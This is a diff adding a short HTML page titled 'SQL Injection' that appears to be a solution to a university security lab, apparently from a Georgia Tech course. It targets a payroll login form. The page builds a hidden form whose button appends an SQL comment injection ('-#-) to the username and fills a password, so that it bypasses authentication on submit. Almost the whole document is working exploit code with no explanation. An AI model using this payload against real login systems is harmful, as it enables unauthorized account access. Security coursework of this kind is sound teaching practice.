@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>SQL Injection</title>
+  </head>
+  <body>
+    <form id="form-to-sub" action="http://payroll.gatech.edu" method="POST">
+      <input name="login" id="targetlogin" value="username" />
+      <button id="exploit">Submit!</button>
+      <input name="MjAyM1NwcmluZz9BbGxBYm91dFNRTGktRWFzdGVyRWdnVGFyZ2V0Mz88PA" type="hidden" value="MjAyM1NwcmluZz9BbGxBYm91dFNRTGktRWFzdGVyRWdnVGFyZ2V0Mz88PA" />
+      <input type="hidden" name="action" value="login" />
+      <input type="hidden" value="whatdidido?" name="secret"/>
+      <input id="pwd" type="hidden" value="" name="pw" />
+    </form>
+    <script>
+	    document.getElementById('exploit').onclick = function() {
+		    document.getElementById('targetlogin').value = document.getElementById('targetlogin').value + `'-#-`;
+		    document.getElementById('pwd').value = 'somecool';
+	    };
+    </script>
+  </body>
+</html>
